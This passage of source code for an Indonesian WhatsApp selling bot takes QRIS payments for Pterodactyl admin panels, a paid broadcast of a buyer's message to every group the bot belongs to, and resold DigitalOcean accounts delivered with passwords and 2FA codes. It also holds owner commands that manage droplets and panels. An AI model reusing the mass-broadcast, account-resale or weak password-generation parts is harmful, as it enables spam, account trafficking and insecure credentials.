Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Xuu.sendMessage(m.chat, {
  footer: `Powered By XuuDev`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.data.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
});
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.data.transactionId, 
amount: get.data.data.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await Xuu.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Xuu.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://payment-xuu.vercel.app/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Xuu.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Admin Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})
let username = Obj.username
let email = username+"@gmail.com"
let name = capital(username)
let password = crypto.randomBytes(4).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var teks = `*Data Akun Admin Panel 📦*

*📡 ID User (${user.id})* 
*👤 Username :* ${user.username}
*🔐 Password :* ${password.toString()}
*🗓️ Created :* ${user.created_at.split("T")[0]}
* ${global.domain}

*Syarat & Ketentuan :*
* Expired akun 1 bulan
* Simpan data ini sebaik mungkin
* Jangan asal hapus server!
* Ketahuan maling sc, auto delete akun no reff!
`
await fs.writeFileSync("./akunpanel.txt", teks)
await Xuu.sendMessage(db.users[m.sender].saweria.chat, {document: fs.readFileSync("./akunpanel.txt"), fileName: "akunpanel.txt", mimetype: "text/plain", caption: teks}, {quoted: m})
await fs.unlinkSync("./akunpanel.txt")
await Xuu.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "buyjasajpm": case "jasajpm": {
if (m.isGroup) return reply("Pembelian jasa jpm hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
const tgc = await Xuu.groupFetchAllParticipating()
let totalgrup = await Object.keys(tgc)
if (!text) return reply(example(`teksnya bisa dengan kirim foto juga\n\n*Total Grup :* ${totalgrup.length} Grup chat\n*Harga :* Rp10.000`))
let Obj = {}
Obj.harga = "10000"
Obj.pesan = text
if (/image/.test(mime)) Obj.img = qmsg
const UrlQr = global.qrisOrderKuota

const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://payment-xuu.vercel.app/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.data.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.data.amount)}
 *• Barang :* Jasa Jpm Pesan
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Xuu.sendMessage(m.chat, {
  footer: `Powered By XuuDev`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.data.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
});
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.data.transactionId, 
amount: get.data.data.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await Xuu.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Xuu.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://payment-xuu.vercel.app/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Xuu.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Admin Panel Pterodactyl
`}, {quoted: db.users[m.sender].saweria.msg})

let rest
if (Obj.img !== undefined) {
rest = await Xuu.downloadAndSaveMediaMessage(Obj.img)
}
const allgrup = await Xuu.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const ttks = Obj.pesan
const pesancoy = rest !== undefined ? { image: await fs.readFileSync(rest), caption: ttks } : { text: ttks }
const opsijpm = rest !== undefined ? "teks & foto" : "teks"
const jid = m.chat
await reply(`Memproses jpm *${opsijpm}* ke ${res.length} grup chat`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await Xuu.sendMessage(i, pesancoy, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
if (rest !== undefined) await fs.unlinkSync(rest)
await Xuu.sendMessage(jid, {text: `Jpm *${opsijpm}* berhasil dikirim ke ${res.length} grup chat`}, {quoted: m})
await Xuu.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "buydo": case "buydigitalocean": {
if (stokdo.length < 1) return reply("Maaf stok do sedang tidak tersedia")
if (m.isGroup) return reply("Pembelian digitalocean hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!text) {
let butnya = []
let urutt = 0
for (let gg of stokdo) {
butnya.push({
title: `${gg.droplet} Droplet`, 
description: `Rp${await toIDR(gg.harga)}`, 
id: `.buydo ${urutt += 1}`
})
}
return Xuu.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Droplet',
          sections: [
            {
              title: 'List Stok Digitalocean',
              highlight_label: 'Recommended',
              rows: butnya
            }
          ]
        })
      }
      }
  ],
  footer: `© AXONIC V10`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Stock Digitalocean\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}

const donya = stokdo[Number(text) - 1]
let us = crypto.randomBytes(4).toString('hex')
let Obj = {}
Obj.harga = donya.harga
Obj.akun = donya
const UrlQr = global.qrisOrderKuota
const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const get = await axios.get(`https://payment-xuu.vercel.app/orkut/createpayment?apikey=${global.apiSimpleBot}&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*── INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.data.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.data.amount)}
 *• Barang :* Digitalocean ${donya.droplet} Drop
 *• Expired :* 5 menit

*Note :* 
Qris pembayaran hanya berlaku dalam 5 menit, jika sudah melewati 5 menit pembayaran dinyatakan tidak valid!
Jika pembayaran berhasil bot akan otomatis mengirim notifikasi status pembayaran kamu.

Ketik *.batalbeli* untuk membatalkan
`
let msgQr = await Xuu.sendMessage(m.chat, {
  footer: `Powered By XuuDev`,
  buttons: [
    {
      buttonId: `.batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.data.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
});
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.data.transactionId, 
amount: get.data.data.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await Xuu.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await Xuu.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const resultcek = await axios.get(`https://payment-xuu.vercel.app/orkut/cekstatus?apikey=${global.apiSimpleBot}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await Xuu.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.idDeposit}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* Digitalocean ${Obj.akun.droplet} Droplet
`}, {quoted: db.users[m.sender].saweria.msg})
var teks = `*Data Akun Digitalocean 📦*

*💌 Email :* ${Obj.akun.email}
*🔐 Password :* ${Obj.akun.password}
*Kode 2FA :* ${Obj.akun.kode2fa}
*Droplet :* ${Obj.akun.droplet}

*Syarat & Ketentuan :*
* Simpan data ini sebaik mungkin
* Seller hanya mengirim 1 kali!
* Garansi akun aktif 30 day
`
await Xuu.sendMessage(db.users[m.sender].saweria.chat, {text: teks}, {quoted: m})
const position = stokdo.indexOf(Obj.akun)
stokdo.splice(position, 1)
await fs.writeFileSync("./library/database/stokdo.json", JSON.stringify(stokdo, null, 2))
await Xuu.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "batalbeli": {
if (m.isGroup) return
if (db.users[m.sender].status_deposit == false) return 
db.users[m.sender].status_deposit = false
if ('saweria' in db.users[m.sender]) {
await Xuu.sendMessage(m.chat, {text: "Berhasil membatalkan pembelian ✅"}, {quoted: db.users[m.sender].saweria.msg})
await Xuu.sendMessage(m.chat, { delete: db.users[m.sender].saweria.msg.key })
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
} else {
return reply("Berhasil membatalkan pembelian ✅")
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'listdroplet': {
if (!isCreator) return Reply(mess.owner)
try {
const getDroplets = async () => {
try {
const response = await fetch('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: "Bearer " + global.apiDigitalOcean
}
});
const data = await response.json();
return data.droplets || [];
} catch (err) {
reply('Error fetching droplets: ' + err);
return [];
}
};

getDroplets().then(droplets => {
let totalvps = droplets.length;
let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;

if (droplets.length === 0) {
mesej += 'Tidak ada droplet yang tersedia!';
} else {
droplets.forEach(droplet => {
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
mesej += `Droplet ID: ${droplet.id}
Hostname: ${droplet.name}
Username: Root
IP: ${ipAddress}
Ram: ${droplet.memory} MB
Cpu: ${droplet.vcpus} CPU
OS: ${droplet.image.distribution}
Storage: ${droplet.disk} GB
Status: ${droplet.status}\n`;
});
}
Xuu.sendMessage(m.chat, { text: mesej }, {quoted: m});
});
} catch (err) {
reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'restartvps': {
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("iddroplet"))
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
m.reply(err);
})

}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'rebuild': {
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("iddroplet"))
let dropletId = text 
let rebuildVPS = async () => {
try {
// Rebuild droplet menggunakan API DigitalOcean
const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'rebuild',
image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
})
});

if (response.ok) {
const data = await response.json();
reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);
const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'GET',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});
if (vpsInfo.ok) {
const vpsData = await vpsInfo.json();
const droplet = vpsData.droplet;
const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

const textvps = `*VPS BERHASIL DI REBUILD*
IP VPS: ${ipAddress}
SYSTEM IMAGE: ${droplet.image.slug}`;
await sleep(60000) 
Xuu.sendMessage(m.chat, { text: textvps }, {quoted: m});
} else {
reply('Gagal mendapatkan informasi VPS setelah rebuild!');
}
} else {
const errorData = await response.json();
reply('Gagal melakukan rebuild VPS : ' + errorData.message);
}
} catch (err) {
reply('Terjadi kesalahan saat melakukan rebuild VPS : ' + err);
}};
rebuildVPS();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "sisadroplet": {
if (!isCreator) return Reply(mess.owner)
async function getDropletInfo() {
try {
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return Reply(mess.owner)

const dropletInfo = await getDropletInfo();
reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "deldroplet": {
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("iddroplet"))
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});

if (response.ok) {
reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.error('Terjadi kesalahan saat menghapus droplet:', error);
reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "cvps": {
if (!text) return reply(example("hostname"))
return Xuu.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Spesifikasi Vps',
          sections: [
            {
              title: 'List Ram & Cpu Vps',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Ram 16GB || CPU 4', 
                  id: `.r16c4 ${text}`
                },
                {
                  title: 'Ram 1GB || CPU 1', 
                  id: `.r1c1 ${text}`
                },
                {
                  title: 'Ram 2GB || CPU 1', 
                  id: `.r2c1 ${text}`
                },
                {
                  title: 'Ram 2GB || CPU 2', 
                  id: `.r2c2 ${text}`
                },
                {
                  title: 'Ram 4GB || CPU 2', 
                  id: `.r4c2 ${text}`
                },      
                {
                  title: 'Ram 8GB || CPU 4', 
                  id: `.r8c4 ${text}`
                }                     
              ]
            }
          ]
        })
      }
      }
  ],
  footer: `© AXONIC V10`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Spesifikasi Vps Yang Tersedia\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "r1c1": case "r2c1": case "r2c2": case "r4c2": case "r8c4": case "r16c4": {
if (!isCreator) return Reply(mess.owner)
if (!text) return
    await sleep(1000)
    let images
    let region = "sgp1"
    if (command == "r1c1") {
    images = "s-1vcpu-1gb"
    } else if (command == "r2c1") {
    images = "s-1vcpu-2gb"
    } else if (command == "r2c2") {
    images = "s-2vcpu-2gb"
    } else if (command == "r4c2") {
    images = "s-2vcpu-4gb"
    } else if (command == "r8c4") {
    images = 's-4vcpu-8gb'
    } else {
    images = "s-4vcpu-16gb-amd"
    region = "sgp1"
    }
    let hostname = text.toLowerCase()
    if (!hostname) return reply(example("hostname"))
    
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: images,
            image: 'ubuntu-20-04-x64',
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: null,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };

        let password = await  generateRandomPassword()
        dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });

        let responseData = await response.json();

        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;

            // Menunggu hingga VPS selesai dibuat
            await reply(`Memproses pembuatan vps...`);
            await new Promise(resolve => setTimeout(resolve, 60000));

            // Mengambil informasi lengkap tentang VPS
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });

            let dropletData = await dropletResponse.json();
            let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 
                ? dropletData.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";

            let messageText = `VPS berhasil dibuat!\n\n`;
            messageText += `ID: ${dropletId}\n`;
            messageText += `IP VPS: ${ipVPS}\n`;
            messageText += `Password: ${password}`;

            await Xuu.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.error(err);
        reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": 
case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": 
case "unlimited": case "unli": {
    if (!isOwner && !isReseller) {
        return m.reply(`Fitur ini untuk di dalam grup reseller panel`);
    }
    if (!text) return m.reply(`*Contoh :* ${cmd} username,6283XXX`)

    let nomor, usernem;
    let tek = text.split(",");
    if (tek.length > 1) {
        let [users, nom] = tek.map(t => t.trim());
        if (!users || !nom) return m.reply(`*Contoh :* ${cmd} username,6283XXX`)
        nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        usernem = users.toLowerCase();
    } else {
        usernem = text.toLowerCase();
        nomor = m.isGroup ? m.sender : m.chat
    }

    try {
        var onWa = await Xuu.onWhatsApp(nomor.split("@")[0]);
        if (onWa.length < 1) return m.reply("Nomor target tidak terdaftar di WhatsApp!");
    } catch (err) {
        return m.reply("Terjadi kesalahan saat mengecek nomor WhatsApp: " + err.message);
    }

    // Mapping RAM, Disk, dan CPU
    const resourceMap = {
        "1gb": { ram: "1000", disk: "1000", cpu: "40" },
        "2gb": { ram: "2000", disk: "1000", cpu: "60" },
        "3gb": { ram: "3000", disk: "2000", cpu: "80" },
        "4gb": { ram: "4000", disk: "2000", cpu: "100" },
        "5gb": { ram: "5000", disk: "3000", cpu: "120" },
        "6gb": { ram: "6000", disk: "3000", cpu: "140" },
        "7gb": { ram: "7000", disk: "4000", cpu: "160" },
        "8gb": { ram: "8000", disk: "4000", cpu: "180" },
        "9gb": { ram: "9000", disk: "5000", cpu: "200" },
        "10gb": { ram: "10000", disk: "5000", cpu: "220" },
        "unlimited": { ram: "0", disk: "0", cpu: "0" }
    };
    
    let { ram, disk, cpu } = resourceMap[command] || { ram: "0", disk: "0", cpu: "0" };

    let username = usernem.toLowerCase();
    let email = username + "@gmail.com";
    let name = global.capital(username) + " Server";
    let password = username + "001";

    try {
        let f = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: { "Accept": "application/json", "Content-Type": "application/json", "Authorization": "Bearer " + apikey },
            body: JSON.stringify({ email, username, first_name: name, last_name: "Server", language: "en", password })
        });
        let data = await f.json();
        if (data.errors) return m.reply("Error: " + JSON.stringify(data.errors[0], null, 2));
        let user = data.attributes;

        let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
            method: "GET",
            headers: { "Accept": "application/json", "Content-Type": "application/json", "Authorization": "Bearer " + apikey }
        });
        let data2 = await f1.json();
        let startup_cmd = data2.attributes.startup;

        let f2 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: { "Accept": "application/json", "Content-Type": "application/json", "Authorization": "Bearer " + apikey },
            body: JSON.stringify({
                name,
                description: global.tanggal(Date.now()),
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_20",
                startup: startup_cmd,
                environment: { INST: "npm", USER_UPLOAD: "0", AUTO_UPDATE: "0", CMD_RUN: "npm start" },
                limits: { memory: ram, swap: 0, disk, io: 500, cpu },
                feature_limits: { databases: 5, backups: 5, allocations: 5 },
                deploy: { locations: [parseInt(loc)], dedicated_ip: false, port_range: [] },
            })
        });
        let result = await f2.json();
        if (result.errors) return m.reply("Error: " + JSON.stringify(result.errors[0], null, 2));
        
        let server = result.attributes;
        var orang = nomor
        if (orang !== m.chat) {
        await m.reply(`Berhasil membuat akun panel ✅\ndata akun terkirim ke nomor ${nomor.split("@")[0]}`)
        }

let teks = `
*Berikut detail akun panel kamu 📦*

📡 Server ID: ${server.id}
👤 Username: \`${user.username}\`
🔐 Password: \`${password}\`
🗓️ Tanggal Aktivasi: ${global.tanggal(Date.now())}

*⚙️ Spesifikasi server panel*
- RAM: ${ram == "0" ? "Unlimited" : ram / 1000 + "GB"}
- Disk: ${disk == "0" ? "Unlimited" : disk / 1000 + "GB"}
- CPU: ${cpu == "0" ? "Unlimited" : cpu + "%"}
- Panel: ${global.domain}

*Rules pembelian panel :*  
- Masa aktif 30 hari  
- Data bersifat pribadi, mohon disimpan dengan aman  
- Garansi berlaku 15 hari (1x replace)  
- Klaim garansi wajib menyertakan *bukti chat pembelian*
`
        await Xuu.sendMessage(orang, { text: teks }, { quoted: m });
    } catch (err) {
        return m.reply("Terjadi kesalahan: " + err.message);
    }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delpanel-response": {
    if (!isOwner) return m.reply(mess.owner);
    if (!text) return 
    
    try {
        const serverResponse = await fetch(domain + "/api/application/servers", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey
            }
        });
        const serverData = await serverResponse.json();
        const servers = serverData.data;
        
        let serverName;
        let serverSection;
        let serverFound = false;
        
        for (const server of servers) {
            const serverAttr = server.attributes;
            
            if (Number(text) === serverAttr.id) {
                serverSection = serverAttr.name.toLowerCase();
                serverName = serverAttr.name;
                serverFound = true;
                
                const deleteServerResponse = await fetch(domain + `/api/application/servers/${serverAttr.id}`, {
                    method: "DELETE",
                    headers: {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    }
                });
                
                if (!deleteServerResponse.ok) {
                    const errorData = await deleteServerResponse.json();
                    console.error("Gagal menghapus server:", errorData);
                }
                
                break;
            }
        }
        
        if (!serverFound) {
            return m.reply("Gagal menghapus server!\nID server tidak ditemukan");
        }
        
        const userResponse = await fetch(domain + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey
            }
        });
        const userData = await userResponse.json();
        const users = userData.data;
        
        for (const user of users) {
            const userAttr = user.attributes;
            
            if (userAttr.first_name.toLowerCase() === serverSection) {
                const deleteUserResponse = await fetch(domain + `/api/application/users/${userAttr.id}`, {
                    method: "DELETE",
                    headers: {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    }
                });
                
                if (!deleteUserResponse.ok) {
                    const errorData = await deleteUserResponse.json();
                    console.error("Gagal menghapus user:", errorData);
                }
                
                break;
            }
        }
        
        await m.reply(`Barhasil Menghapus Sever Panel ✅\nNama Server: ${capital(serverName)}`);
        
    } catch (error) {
        console.error("Error dalam proses delpanel:", error);
        await m.reply("Terjadi kesalahan saat memproses permintaan");
    }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delpanel-all": {
if (!isOwner) return m.reply(mess.owner)
await m.reply(`Memproses penghapusan semua user & server panel yang bukan admin`)
try {
const PTERO_URL = global.domain
// Ganti dengan URL panel Pterodactyl
const API_KEY = global.apikey// API Key dengan akses admin

// Konfigurasi headers
const headers = {
  "Authorization": "Bearer " + API_KEY,
  "Content-Type": "application/json",
  "Accept": "application/json",
};

// Fungsi untuk mendapatkan semua user
async function getUsers() {
  try {
    const res = await axios.get(`${PTERO_URL}/api/application/users`, { headers });
    return res.data.data;
  } catch (error) {
